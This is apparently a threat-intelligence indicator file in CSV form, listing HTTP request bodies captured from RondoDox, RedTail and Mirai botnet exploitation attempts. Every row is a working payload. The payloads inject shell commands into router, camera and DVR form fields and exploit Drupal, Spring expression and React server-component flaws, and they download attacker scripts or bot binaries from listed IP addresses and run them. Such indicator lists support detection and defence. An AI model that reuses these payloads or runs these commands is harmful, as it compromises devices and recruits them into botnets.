Threat,Indicator Type,Indicator
RondoDox,HTTP Request Body,"page=login&newUI=0&username=admin&password=password&hostname=localhost&ipaddr=127.0.0.1&homepage=index&sysinitpage=index&wizardpage=index&login_page=index&lang_select=0&langChange=0&key=%27%20%60wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.rtg.sh%7Csh%60%20%23,6"
RondoDox,HTTP Request Body,"page=system.html&c32_Titlename=Camera1&i_TitleShow=&i_Language=0&i_OSD_En=0&i_OSDPos=0&OSD_Video_En=0&i_OSDdata_format=0&i_TimeZone=GMT%2B02%3A00&oTimeZone=GMT%2B02%3A00&uc_Daylight_En=0&uc_DaylightBM=3&uc_DaylightBW=1&uc_DaylightBD=0&uc_DaylightBTH=0&uc_DaylightEM=11&uc_DaylightEW=0&uc_DaylightED=6&uc_DaylightETH=0&i_UseNtp=1&c64_Ntp_Server=%24%28busybox%20wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.kmh.sh%7Csh%29&ui_Ntp_Updata=5&i_Time_Shift=1&sDate=2024%2F08%2F22&sTime=18%3A38%3A08&mDate=2024%2F08%2F22&mTime=18%3A37%3A07&LEDindicator=0&TimeZone=-120&Timesync=&RedirectUrl=&action=Apply,6"
RondoDox,HTTP Request Body,"src_file=result&cmd_save=func%20get%20ping%20%60wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.rfg.sh%7Csh%60%3B&_=0.0038560533468083857,6"
RondoDox,HTTP Request Body,"sysCmd=wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.rbv.sh%7Csh%26&apply=Apply&msg=,6"
RondoDox,HTTP Request Body,"time1=00:00-00:00&time2=00:00-00:00&mac=%3Bwget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.xqe.sh%7Csh%26%23,5"
RondoDox,HTTP Request Body,"{""method"":""put"",""form"":""form-4-8"",""session"":"""",""params"":{""ipaddr"":""1;wget -qO- http://23.228.188.126/rondo.dgj.sh|sh""}},5"
RondoDox,HTTP Request Body,"{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B1337\""}"",""_response"":{""_prefix"":""process.mainModule.require('child_process').execSync('(wget -qO- http://41.231.37.153/rondo.aqu.sh||busybox wget -qO- http://41.231.37.153/rondo.aqu.sh||curl -s http://41.231.37.153/rondo.aqu.sh)|sh&');"",""_chunks"":""$Q2"",""_formData"":{""get"":""$1:constructor:constructor""}}}"
RondoDox,HTTP Request Body,<string>(wget -qO- http://74.194.191.52/rondo.xcw.sh||busybox wget -qO- http://74.194.191.52/rondo.xcw.sh||curl -s http://74.194.191.52/rondo.xcw.sh)|sh&amp;</string>
RondoDox,HTTP Request Body,"command=%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.dcd.sh%7Csh%26echo%20,3"
RondoDox,HTTP Request Body,"command=busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.qyz.sh%7Csh%26&SystemCommandSubmit=Apply,3"
RondoDox,HTTP Request Body,"html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0Abusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zta.sh%7Csh%26,3"
RondoDox,HTTP Request Body,"submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&ttcp_ip=-h%20%60busybox%20wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.jbt.sh%7Csh%60&StartEPI=1,3"
RondoDox,HTTP Request Body,"time_mode=0&time_YEAR=0&time_MONTH=0&time_DAY=0&time_HOUR=0&time_MINUTE=0&time_SECOND=0&TIMEZONE=50&year=&month=&day=&CONFIGURE_NTP=on&SPECIFIC_SERVER=%24%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.qbq.sh%7Csh%29&CONFIGURE_NTP_SYNC_BY_PRESET_TIME=on&SYNC_PRESET_TIME_HOURS=0,3"
RondoDox,HTTP Request Body,"{""action"":""set_timesetting"",""data"":{""ntpserver0"":""`wget -qO- http://74.194.191.52/rondo.cgc.sh|sh`"",""ntpserver1"":""time1.google.com"",""timezone"":""UTC-8""}},3"
RondoDox,HTTP Request Body,"(wget -qO- http://74.194.191.52/rondo.dgx.sh||busybox wget -qO- http://74.194.191.52/rondo.dgx.sh||curl -s http://74.194.191.52/rondo.dgx.sh)|sh&,2"
RondoDox,HTTP Request Body,"<?xml version=""1.0"" encoding=""UTF-8""?><DVR Platform=""Hi3520""><SetConfiguration File=""service.xml""><![CDATA[<?xml version=""1.0"" encoding=""UTF-8""?><DVR Platform=""Hi3520""><Service><NTP Enable=""True"" Interval=""20000"" Server=""time.nist.gov&busybox wget -qO- http://74.194.191.52/rondo.tkg.sh|sh&echo ""/></Service></DVR>]]></SetConfiguration></DVR>,2"
RondoDox,HTTP Request Body,"C1=ON&cmd=cgi_ntp_time&f_ntp_server=%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.djc.sh%7Csh%60,2"
RondoDox,HTTP Request Body,"XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=%3B%60busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zxb.sh%7Csh%60%3B&ipv=0,2"
RondoDox,HTTP Request Body,"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%29%7Csh,2"
RondoDox,HTTP Request Body,"action=ApplyTake&change_action=gozila_cgi&del_value=&next_page=Diagnostics.asp&ping_ip=busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.gvt.sh%7Csh%26&submit_button=Ping&submit_type=start,2"
RondoDox,HTTP Request Body,"adj_time_sec=32&change_action=gozila_cgi&adj_time_day=27&adj_time_mon=10&adj_time_hour=11&adj_time_year=%24%28busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.gvt.sh%7Csh%29&adj_time_min=35&submit_button=index&action=Save&submit_type=adjust_sys_time,2"
RondoDox,HTTP Request Body,"cgiName=time_tzsetup.cgi&page=%2Fcfg_system_time.htm&id=69&ntp=%60curl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.qyt.sh%7Csh%60&ntp1=time.stdtime.gov.tw&ntp2=%600123456789ABCDEF%60&isEnabled=0&timeDiff=%2B9&ntpAutoSync=1&ntpSyncMode=1&day=0&hour=0&min=0&syncDiff=30,2"
RondoDox,HTTP Request Body,"f_smtpserver=%3Bwget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.djc.sh%7Csh%26,2"
RondoDox,HTTP Request Body,"form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23type%5D=markup&mail%5B%23markup%5D=%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.bxf.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.bxf.sh%29%7Csh%26,2"
RondoDox,HTTP Request Body,"macAddress=112233445566%3Bbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.tha.sh%7Csh%20%23&reginfo=0&writeData=Submit,2"
RondoDox,HTTP Request Body,"page=login&newUI=0&username=admin&password=password&hostname=localhost&ipaddr=127.0.0.1&homepage=index&sysinitpage=index&wizardpage=index&login_page=index&lang_select=0&langChange=0&key=%27%20%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.rtg.sh%7Csh%60%20%23,2"
RondoDox,HTTP Request Body,"page=system.html&c32_Titlename=Camera1&i_TitleShow=&i_Language=0&i_OSD_En=0&i_OSDPos=0&OSD_Video_En=0&i_OSDdata_format=0&i_TimeZone=GMT%2B02%3A00&oTimeZone=GMT%2B02%3A00&uc_Daylight_En=0&uc_DaylightBM=3&uc_DaylightBW=1&uc_DaylightBD=0&uc_DaylightBTH=0&uc_DaylightEM=11&uc_DaylightEW=0&uc_DaylightED=6&uc_DaylightETH=0&i_UseNtp=1&c64_Ntp_Server=%24%28busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.kmh.sh%7Csh%29&ui_Ntp_Updata=5&i_Time_Shift=1&sDate=2024%2F08%2F22&sTime=18%3A38%3A08&mDate=2024%2F08%2F22&mTime=18%3A37%3A07&LEDindicator=0&TimeZone=-120&Timesync=&RedirectUrl=&action=Apply,2"
RondoDox,HTTP Request Body,"post_service=%3Bwget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.aqu.sh%7Csh,2"
RondoDox,HTTP Request Body,"src_file=result&cmd_save=func%20get%20ping%20%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.rfg.sh%7Csh%60%3B&_=0.0038560533468083857,2"
RondoDox,HTTP Request Body,"sysCmd=wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.rbv.sh%7Csh%26&apply=Apply&msg=,2"
RondoDox,HTTP Request Body,"act=ping&dst=%60busybox%20wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.npe.sh%7Csh%60,1"
RondoDox,HTTP Request Body,"act=ping&dst=%60busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.npe.sh%7Csh%60,1"
RondoDox,HTTP Request Body,"pingMode=tranceroute&action=&hop=1&domain=%60busybox%20wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.uzz.sh%7Csh%60&ip=&packetSize=&pro_ver=&timeout=,1"
RondoDox,HTTP Request Body,"pingMode=tranceroute&action=&hop=1&domain=%60busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.uzz.sh%7Csh%60&ip=&packetSize=&pro_ver=&timeout=,1"
RondoDox,HTTP Request Body,"submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&ttcp_ip=-h%20%60busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.jbt.sh%7Csh%60&StartEPI=1,1"
RondoDox,HTTP Request Body,"time1=00:00-00:00&time2=00:00-00:00&mac=%3Bwget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.xqe.sh%7Csh%26echo%20,1"
RondoDox,HTTP Request Body,"{""id"": ""rxvpkejx"", ""filters"": [{""name"": ""AddResponseHeader"", ""args"": {""name"": ""Result"", ""value"": ""#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\""(wget -qO- http://74.194.191.52/rondo.pju.sh||busybox wget -qO- http://74.194.191.52/rondo.pju.sh||curl -s http://74.194.191.52/rondo.pju.sh)|sh\"").getInputStream()))}""}}], ""uri"": ""http://example.com""},1"
RedTail,HTTP Request Body,cd /tmp || cd /var/tmp; curl http://178.16.55.224/sh -o redtail.sh || wget http://178.16.55.224/sh -O redtail.sh; chmod +x redtail.sh; ./redtail.sh apache.selfrep; rm -rf redtail.sh
Mirai,HTTP Request Body,"time1=00:00-00:00&time2=00:00-00:00&mac=;wget 41.216.189.47/1.sh; curl -O 41.216.189.47/1.sh; chmod 777 1.sh; sh 1.sh; rm -rf 1.sh; rm -rf 1.sh*,24"
Mirai,HTTP Request Body,"time1=00:00-00:00&time2=00:00-00:00&mac=;wget 41.216.189.88/1.sh; curl -O 41.216.189.88/1.sh; chmod 777 1.sh; sh 1.sh; rm -rf 1.sh; rm -rf 1.sh*,22"
Mirai,HTTP Request Body,"ping_addr=;cd /tmp; cd /tmp; rm -f ppp.sh; (wget http://138.124.14.194/ppp.sh -O ppp.sh || curl -O http://138.124.14.194/ppp.sh || busybox wget http://138.124.14.194/ppp.sh -O ppp.sh); chmod 777 ppp.sh; sh ppp.sh &,8"
Mirai,HTTP Request Body,"time1=00:00-00:00&time2=00:00-00:00&mac=;wget 41.216.189.185/1.sh; curl -O 41.216.189.185/1.sh; chmod 777 1.sh; sh 1.sh; rm -rf 1.sh; rm -rf 1.sh*,8"
Mirai,HTTP Request Body,"IF_ACTION=apply&IF_ERRORSTR=SUCC&CMD=cd /tmp; cd /tmp; rm -f ppp.sh; (wget http://138.124.14.194/ppp.sh -O ppp.sh || curl -O http://138.124.14.194/ppp.sh || busybox wget http://138.124.14.194/ppp.sh -O ppp.sh); chmod 777 ppp.sh; sh ppp.sh &,4"
Mirai,HTTP Request Body,"act=ping&dst=cd /tmp; cd /tmp; rm -f ppp.sh; (wget http://138.124.14.194/ppp.sh -O ppp.sh || curl -O http://138.124.14.194/ppp.sh || busybox wget http://138.124.14.194/ppp.sh -O ppp.sh); chmod 777 ppp.sh; sh ppp.sh &,4"
Mirai,HTTP Request Body,"cmd=cd /tmp; cd /tmp; rm -f ppp.sh; (wget http://138.124.14.194/ppp.sh -O ppp.sh || curl -O http://138.124.14.194/ppp.sh || busybox wget http://138.124.14.194/ppp.sh -O ppp.sh); chmod 777 ppp.sh; sh ppp.sh &,4"
Mirai,HTTP Request Body,"operation=write&cmd=cd /tmp; cd /tmp; rm -f ppp.sh; (wget http://138.124.14.194/ppp.sh -O ppp.sh || curl -O http://138.124.14.194/ppp.sh || busybox wget http://138.124.14.194/ppp.sh -O ppp.sh); chmod 777 ppp.sh; sh ppp.sh &,4"
Mirai,HTTP Request Body,"<?xml version=""1.0""?><s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/"" s:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/""><s:Body><u:Upgrade xmlns:u=""urn:schemas-upnp-org:service:WANPPPConnection:1""><NewStatusURL>$(cd /tmp; cd /tmp; rm -f ppp.sh; (wget http://138.124.14.194/ppp.sh -O ppp.sh || curl -O http://138.124.14.194/ppp.sh || busybox wget http://138.124.14.194/ppp.sh -O ppp.sh); chmod 777 ppp.sh; sh ppp.sh &)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>,2"
Mirai,HTTP Request Body,"<?xml version=""1.0""?><s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/"" s:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/""><s:Body><u:Upgrade xmlns:u=""urn:schemas-upnp-org:service:WANPPPConnection:1""><NewStatusURL>$(cd /tmp; cd /tmp; rm -f ppp.sh; (wget http://138.124.14.194/ppp.sh -O ppp.sh || curl -O http://138.124.14.194/ppp.sh || busybox wget http://138.124.14.194/ppp.sh -O ppp.sh); chmod 777 ppp.sh; sh ppp.sh &)</NewStatusURL><NewDownloadURL>$(echo)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>,2"
Mirai,HTTP Request Body,"<NewInternalClient>`cd /tmp; cd /tmp; rm -f ppp.sh; (wget http://138.124.14.194/ppp.sh -O ppp.sh || curl -O http://138.124.14.194/ppp.sh || busybox wget http://138.124.14.194/ppp.sh -O ppp.sh); chmod 777 ppp.sh; sh ppp.sh &`</NewInternalClient>,2"
Mirai,HTTP Request Body,"XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=;cd /tmp; cd /tmp; rm -f ppp.sh; (wget http://138.124.14.194/ppp.sh -O ppp.sh || curl -O http://138.124.14.194/ppp.sh || busybox wget http://138.124.14.194/ppp.sh -O ppp.sh); chmod 777 ppp.sh; sh ppp.sh &&ipv=0,2"
Mirai,HTTP Request Body,"operation=write&country=$(id>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://151.242.30.13/1.sh; curl -O http://151.242.30.13/1.sh; chmod 777 1.sh; sh 1.sh; tftp 151.242.30.13 -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g 151.242.30.13; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 151.242.30.13 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *),2"
Mirai,HTTP Request Body,"operation=write&country=$(wget http://138.124.14.194/ppp.sh -O /tmp/ppp.sh;sh /tmp/ppp.sh),2"
Mirai,HTTP Request Body,"remote_host=;cd /tmp; cd /tmp; rm -f ppp.sh; (wget http://138.124.14.194/ppp.sh -O ppp.sh || curl -O http://138.124.14.194/ppp.sh || busybox wget http://138.124.14.194/ppp.sh -O ppp.sh); chmod 777 ppp.sh; sh ppp.sh &,2"
Mirai,HTTP Request Body,"submit_button=Ping&action=Apply&ping_ip=;cd /tmp; cd /tmp; rm -f ppp.sh; (wget http://138.124.14.194/ppp.sh -O ppp.sh || curl -O http://138.124.14.194/ppp.sh || busybox wget http://138.124.14.194/ppp.sh -O ppp.sh); chmod 777 ppp.sh; sh ppp.sh &,2"
Mirai,HTTP Request Body,"XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=127.0.0.1;wget http://138.124.14.194/ppp.sh -O /tmp/ppp.sh;chmod 777 /tmp/ppp.sh;/tmp/ppp.sh&ipv=0,1"
Mirai,HTTP Request Body,"operation=write&country=$(id>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.135/1.sh; curl -O http://103.77.241.135/1.sh; chmod 777 1.sh; sh 1.sh; tftp 103.77.241.135 -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g 103.77.241.135; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 103.77.241.135 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *),1"
Mirai,HTTP Request Body,"operation=write&country=$(id>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.77.241.148/1.sh; curl -O http://103.77.241.148/1.sh; chmod 777 1.sh; sh 1.sh; tftp 103.77.241.148 -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g 103.77.241.148; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 103.77.241.148 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *),1"
Mirai,HTTP Request Body,"operation=write&country=$(id>cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.135.194.71/1.sh; curl -O http://45.135.194.71/1.sh; chmod 777 1.sh; sh 1.sh; tftp 45.135.194.71 -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g 45.135.194.71; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 45.135.194.71 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *),1"
Mirai,HTTP Request Body,"{""code"":""def run(cd=exec('raise Exception(__import__(\""subprocess\"").check_output(\""curl http://194.116.236.109/8UsA.sh|sh\"", shell=True))')): pass""},1"
Mirai,HTTP Request Body,"{""code"":""def run(cd=exec('raise Exception(__import__(\""subprocess\"").check_output(\""curl http://85.120.229.147/8UsA.sh|sh\"", shell=True))')): pass""},1"
Mirai,HTTP Request Body,"{""then"": ""$1:__proto__:then"",""status"": ""resolved_model"",""reason"": -1,""value"": ""{\""then\"":\""$B1337\""}"",""_response"": {""_prefix"": ""var res=process.mainModule.require('child_process').execSync('(cd /dev;busybox wget http://193.34.213.150/nuts/x86;chmod 777 x86;./x86 reactOnMynuts;busybox wget -q http://193.34.213.150/nuts/bolts -O-|sh)',{'timeout':120000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"",""_chunks"": ""$Q2"",""_formData"": {""get"": ""$1:constructor:constructor""}}}"
Mirai,HTTP Request Body,"{""then"": ""$1:__proto__:then"",""status"": ""resolved_model"",""reason"": -1,""value"": ""{\""then\"":\""$B1337\""}"",""_response"": {""_prefix"": ""var res=process.mainModule.require('child_process').execSync('(cd /dev;busybox wget http://31.56.27.76/n2/x86;chmod 777 x86;./x86 reactOnMynuts;busybox wget -q http://193.34.213.150/nuts/bolts -O-|sh)',{'timeout':120000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"",""_chunks"": ""$Q2"",""_formData"": {""get"": ""$1:constructor:constructor""}}}"
Mirai,HTTP Request Body,"{""then"": ""$1:__proto__:then"",""status"": ""resolved_model"",""reason"": -1,""value"": ""{\""then\"":\""$B1337\""}"",""_response"": {""_prefix"": ""var res=process.mainModule.require('child_process').execSync('ping -c 1 45.157.233.80',{'timeout':8000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"",""_chunks"": ""$Q2"",""_formData"": {""get"": ""$1:constructor:constructor""}}}"
Mirai,HTTP Request Body,"{""then"": ""$1:__proto__:then"",""status"": ""resolved_model"",""reason"": -1,""value"": ""{\""then\"":\""$B1337\""}"",""_response"": {""_prefix"": ""var res=process.mainModule.require('child_process').execSync('(cd /dev;busybox wget http://193.34.213.150/nuts/x86;chmod 777 x86;./x86 reactOnMynuts;busybox wget -q http://193.34.213.150/nuts/bolts -O-|sh)',{'timeout':120000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"",""_chunks"": ""$Q2"",""_formData"": {""get"": ""$1:constructor:constructor""}}}"
Mirai,HTTP Request Body,"{""then"": ""$1:__proto__:then"",""status"": ""resolved_model"",""reason"": -1,""value"": ""{\""then\"":\""$B1337\""}"",""_response"": {""_prefix"": ""var res=process.mainModule.require('child_process').execSync('(cd /dev;busybox wget http://31.56.27.76/n2/x86;chmod 777 x86;./x86 reactOnMynuts;busybox wget -q http://193.34.213.150/nuts/bolts -O-|sh)',{'timeout':120000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"",""_chunks"": ""$Q2"",""_formData"": {""get"": ""$1:constructor:constructor""}}}"
Mirai,HTTP Request Body,"{""_bundlerConfig"":[],""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$3:constructor:constructor""},""_prefix"":""return process.mainModule.require('child_process').execSync('cd /tmp; wget http://23.132.164.54/bot; chmod 777 bot; ./bot || cd /tmp; curl -O http://23.132.164.54/bot; chmod 777 bot; ./bot ');//""}"
Mirai,HTTP Request Body,"{""_bundlerConfig"":[],""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$3:constructor:constructor""},""_prefix"":""return process.mainModule.require('child_process').execSync('cd /tmp; wget http://gfxnick.emerald.usbx.me/bot; chmod 777 bot; ./bot || cd /tmp; curl -O http://gfxnick.emerald.usbx.me/bot; chmod 777 bot; ./bot ');//""}"
